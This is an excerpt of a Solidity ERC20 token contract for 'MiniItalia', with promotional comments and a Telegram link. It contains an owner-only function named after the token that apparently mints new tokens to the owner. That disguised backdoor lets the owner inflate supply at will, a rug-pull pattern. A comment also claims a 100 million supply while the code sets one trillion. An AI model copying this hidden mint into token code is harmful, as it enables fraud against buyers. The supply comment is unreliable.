...
//
// $midnightfriday proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/MiniItaliaBsc
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function MiniItalia(uint256 amount) public onlyOwner {
    _MiniItalia(msg.sender, amount);
    }
    ...
    function _MiniItalia(address account, uint256 amount) internal virtual {
...
contract MiniItalia is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 100 Million Token Supply

    constructor() public ERC20("MiniItalia", "MIT") {
        _MiniItalia(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}